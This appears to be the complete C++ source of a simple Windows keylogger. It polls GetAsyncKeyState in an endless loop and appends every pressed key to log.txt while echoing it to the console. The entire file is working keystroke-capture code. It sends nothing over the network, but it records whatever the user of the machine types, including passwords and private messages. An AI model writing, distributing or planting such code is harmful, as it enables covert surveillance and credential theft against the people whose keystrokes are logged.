#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

void Save(std::string key, char* file);

int main()
{
	//loops forever
	while (true) {
		//goes through common keycodes
		for (char keycode = 8; keycode <= 255; keycode++) {
			//checks if key is pressed
			if (GetAsyncKeyState(keycode) == -32767) {
				std::string key;
				if (keycode == VK_BACK)
					key = "[B]";
				else if (keycode == VK_SHIFT)
					key = "[S]";
				else //turns decimal value into character
					key = std::string(1, static_cast<char>(keycode));
				//saves it in file and outputs to console
				Save(key, "log.txt");
			}

		}
	}
	return 0;
}

void Save(std::string key, char* file) {
	//file variable
	std::ofstream log;
	//opens with the given file path
	log.open(file, std::fstream::app);
	//writes to the file
	log << key;
	//outputs on console
	std::cout << key;
}

